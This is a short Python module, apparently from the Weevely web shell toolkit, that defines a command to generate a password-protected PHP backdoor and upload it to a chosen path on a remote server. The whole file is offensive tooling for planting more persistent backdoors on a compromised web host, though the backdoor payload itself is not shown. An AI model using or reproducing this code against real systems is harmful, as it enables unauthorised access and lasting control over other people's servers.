'''
Created on 28/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.backdoor import Backdoor
from core.parameters import ParametersList, Parameter as P

classname = 'Install'
    
class Install(Module):
    """Install another Weevely backdoor 
    :backdoor.install <password> <remote path>
    """
    
    params = ParametersList('Upload further Weevely backdoor', None,
            P(arg='pwd', help='Password to generate PHP backdoor', required=True, pos=0),
            P(arg='rpath', help='Remote path where upload file', required=True, pos=1))
    
    def run_module(self, password, remote_path):

        backdoor = Backdoor(password)
        self.modhandler.load('file.upload').run_module('', remote_path, file_content = str(backdoor))
        
           
    